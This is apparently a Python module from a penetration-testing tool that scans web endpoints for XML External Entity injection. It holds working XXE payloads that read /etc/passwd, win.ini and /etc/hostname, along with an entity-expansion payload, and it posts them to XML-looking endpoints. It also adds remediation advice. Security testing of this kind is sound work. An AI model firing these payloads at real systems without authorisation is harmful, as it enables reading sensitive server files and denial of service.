"""XML External Entity (XXE) injection testing."""

from __future__ import annotations

from typing import Any

from pencheff.config import Severity
from pencheff.core.findings import Evidence, Finding
from pencheff.core.http_client import PencheffHTTPClient
from pencheff.core.session import PentestSession
from pencheff.modules.base import BaseTestModule

XXE_PAYLOADS = [
    # Classic file read
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        '<root><data>&xxe;</data></root>',
        ["root:x:0:0", "/bin/bash", "/bin/sh"],
        "File read (etc/passwd)",
    ),
    # Windows file read
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>'
        '<root><data>&xxe;</data></root>',
        ["[fonts]", "[extensions]", "for 16-bit"],
        "File read (win.ini)",
    ),
    # Parameter entity (blind XXE detection)
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/hostname">'
        '<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM \'file:///nonexistent/&xxe;\'>">%eval;%error;]>'
        '<root>test</root>',
        ["error", "failed", "not found"],
        "Parameter entity blind XXE",
    ),
    # Billion laughs (entity expansion DoS detection — very short version)
    (
        '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol">'
        '<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;">]>'
        '<root>&lol2;</root>',
        ["lollollol"],
        "Entity expansion",
    ),
]


class XXEModule(BaseTestModule):
    name = "xxe"
    category = "injection"
    owasp_categories = ["A05"]
    description = "XML External Entity injection testing"

    def get_techniques(self) -> list[str]:
        return ["classic_xxe", "blind_xxe", "parameter_entity", "entity_expansion"]

    async def run(
        self,
        session: PentestSession,
        http: PencheffHTTPClient,
        targets: list[str] | None = None,
        config: dict[str, Any] | None = None,
    ) -> list[Finding]:
        findings = []
        endpoints = self._get_target_endpoints(session, targets)
        base_url = session.target.base_url

        # Test endpoints that accept XML
        xml_endpoints = []
        for ep in endpoints:
            if any(kw in ep["url"].lower() for kw in ["xml", "soap", "wsdl", "rss", "feed", "import", "upload"]):
                xml_endpoints.append(ep)

        # Also test the base URL with XML content type
        xml_endpoints.append({"url": base_url, "method": "POST", "params": []})

        for ep in self._cap_endpoints(xml_endpoints, 10):
            url = ep["url"]

            for payload, markers, desc in XXE_PAYLOADS:
                try:
                    resp = await http.post(
                        url,
                        body=payload,
                        headers={"Content-Type": "application/xml"},
                        module="xxe",
                    )

                    body = resp.text.lower()
                    for marker in markers:
                        if marker.lower() in body:
                            findings.append(Finding(
                                title=f"XML External Entity Injection ({desc})",
                                severity=Severity.CRITICAL if "file read" in desc.lower() else Severity.HIGH,
                                category="injection",
                                owasp_category="A05",
                                description=f"XXE vulnerability found at {url}. "
                                            f"Technique: {desc}. The XML parser processes external entities.",
                                remediation="Disable external entity processing in the XML parser. "
                                            "Use 'FEATURE_SECURE_PROCESSING'. Prefer JSON over XML where possible.",
                                endpoint=url,
                                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:L",
                                cvss_score=8.6,
                                cwe_id="CWE-611",
                                evidence=[Evidence(
                                    request_method="POST",
                                    request_url=url,
                                    request_body=payload[:200],
                                    response_status=resp.status_code,
                                    response_body_snippet=resp.text[:300],
                                    description=f"Marker '{marker}' found in response",
                                )],
                            ))
                            break
                except Exception:
                    continue

        return findings
